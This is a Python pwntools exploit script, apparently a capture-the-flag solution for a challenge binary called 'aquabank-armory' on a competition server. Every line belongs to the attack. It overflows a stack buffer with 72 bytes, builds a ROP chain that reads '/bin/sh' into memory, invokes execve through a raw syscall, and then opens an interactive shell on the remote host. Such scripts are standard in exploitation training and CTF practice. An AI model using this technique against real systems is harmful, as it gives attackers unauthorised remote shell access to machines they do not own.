#!/usr/bin/env python3
from pwn import *

elf = ELF('./aquabank-armory', checksec=False)
context.binary = elf
context.arch = 'amd64'

OFFSET_TO_RIP = 72

pop_rdi = elf.sym.pop_rdi_ret
pop_rsi = elf.sym.pop_rsi_ret
pop_rdx = elf.sym.pop_rdx_ret
syscall = elf.sym.syscall_ret

rop = ROP(elf)
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
bss_addr = elf.bss()

HOST = "offsec.m0lecon.it"
PORT = 13503


def conn():
    if not args.LOCAL:
        return remote(HOST, PORT)
    return process(elf.path)


p = conn()

payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(pop_rdi),
    p64(0),
    p64(pop_rsi),
    p64(bss_addr),
    p64(pop_rdx),
    p64(8),
    p64(pop_rax),
    p64(0),
    p64(syscall),
    p64(pop_rdi),
    p64(bss_addr),
    p64(pop_rsi),
    p64(0),
    p64(pop_rdx),
    p64(0),
    p64(pop_rax),
    p64(59),
    p64(syscall)
)

p.recvuntil(b"weapons:\n")
p.send(payload)
p.send(b"/bin/sh\x00")
p.interactive()